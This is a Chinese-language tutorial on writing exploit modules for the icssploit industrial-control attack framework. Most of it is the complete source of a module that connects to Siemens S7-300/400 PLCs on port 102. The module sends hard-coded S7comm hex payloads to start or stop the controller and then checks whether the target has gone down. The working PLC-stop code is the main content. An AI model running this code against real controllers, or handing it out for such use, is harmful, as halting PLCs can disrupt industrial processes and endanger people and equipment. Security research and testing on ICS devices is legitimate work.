# 如何创建一个module

# 创建一个exploit module
我们以s7_300_400_plc_control这个module为例进行说明。
## import 
```python
from icssploit import (
    exploits,       # exploit的基础库
    print_success,  # 用于打印成功信息
    print_status,   # 用于打印普通信息
    print_error,    # 用于打印错误信息
    mute,           # 用于禁止print信息到标准输出
    validators,     # 用于检查module输入参数的有效性
)

```
## Exploit 类
### 定义模块基本信息
`__info__` 用于定义show info指令输出的内容，下面是一个基础的info输出样例。
```python
    __info__ = {
        'name': 'S7-300/400 PLC Control',
        'authors': [
            'wenzhe zhu <jtrkid[at]gmail.com>',
        ],
        'description': 'Use S7comm command to start/stop plc.',
        'references': [

        ],
        'devices': [
            'Siemens S7-300 and S7-400 programmable logic controllers (PLCs)',
        ],
    }
```
### 定义options参数
module中定义的参数需要用`exploits.Option`来进行添加，同时可以使用`validators`对输入的参数进行有效性验证。

常用的validators有如下几个:
```python
validators.ipv4     # IPv4地址
validators.integer  # Int型数据
validators.url      # url地址
validators.mac      # mac地址
validators.boolify  # 布尔型数据
```

例子:
```python
target = exploits.Option('', 'Target address e.g. 192.168.1.1', validators=validators.ipv4)
port = exploits.Option(102, 'Target Port', validators=validators.integer)
slot = exploits.Option(2, 'CPU slot number.', validators=validators.integer)
command = exploits.Option(1, 'Command 0:start plc, 1:stop plc.', validators=validators.integer)
sock = None

```


### Exploit 功能编写

 * `check` - 通常用于检查目标对象是否存在该漏洞。
 * `run` - 在isf中使用module后执行run指令将会执行方法run中的代码。
 * `exploit` - 具体的利用代码。
 
 module的结构相对比较简单，除了方法run为必须存在外，可以按照自己的喜好进行module的编写。 


### Exploit例子
下面是一个s7_300_400_plc_control这个modules的代码，可用于参考。
```python
from icssploit import (
    exploits,
    print_success,
    print_status,
    print_error,
    mute,
    validators,
)
import socket
import time

setup_communication_payload = '0300001902f08032010000020000080000f0000002000201e0'.decode('hex')
cpu_start_payload = "0300002502f0803201000005000014000028000000000000fd000009505f50524f4752414d".decode('hex')
cpu_stop_payload = "0300002102f0803201000006000010000029000000000009505f50524f4752414d".decode('hex')


class Exploit(exploits.Exploit):
    """
    Exploit implementation for siemens S7-300 and S7-400 PLCs Dos vulnerability.
    """
    __info__ = {
        'name': 'S7-300/400 PLC Control',
        'authors': [
            'wenzhe zhu <jtrkid[at]gmail.com>',
        ],
        'description': 'Use S7comm command to start/stop plc.',
        'references': [

        ],
        'devices': [
            'Siemens S7-300 and S7-400 programmable logic controllers (PLCs)',
        ],
    }

    target = exploits.Option('', 'Target address e.g. 192.168.1.1', validators=validators.ipv4)
    port = exploits.Option(102, 'Target Port', validators=validators.integer)
    slot = exploits.Option(2, 'CPU slot number.', validators=validators.integer)
    command = exploits.Option(1, 'Command 0:start plc, 1:stop plc.', validators=validators.integer)
    sock = None

    def create_connect(self, slot):
        slot_num = chr(slot)
        create_connect_payload = '0300001611e00000001400c1020100c20201'.decode('hex') + slot_num + 'c0010a'.decode('hex')
        self.sock.send(create_connect_payload)
        self.sock.recv(1024)
        self.sock.send(setup_communication_payload)
        self.sock.recv(1024)

    def exploit(self):
        self.sock = socket.socket()
        self.sock.connect((self.target, self.port))
        self.create_connect(self.slot)
        if self.command == 0:
            print_status("Start plc")
            self.sock.send(cpu_start_payload)
        elif self.command == 1:
            print_status("Stop plc")
            self.sock.send(cpu_stop_payload)
        else:
            print_error("Command %s didn't support" % self.command)

    def run(self):
        if self._check_alive():
            print_success("Target is alive")
            print_status("Sending packet to target")
            self.exploit()
            if not self._check_alive():
                print_success("Target is down")
        else:
            print_error("Target is not alive")

    @mute
    # TODO: Add check later
    def check(self):
        pass

    def _check_alive(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((self.target, self.port))
            sock.close()
        except Exception:
            return False
        return True
```
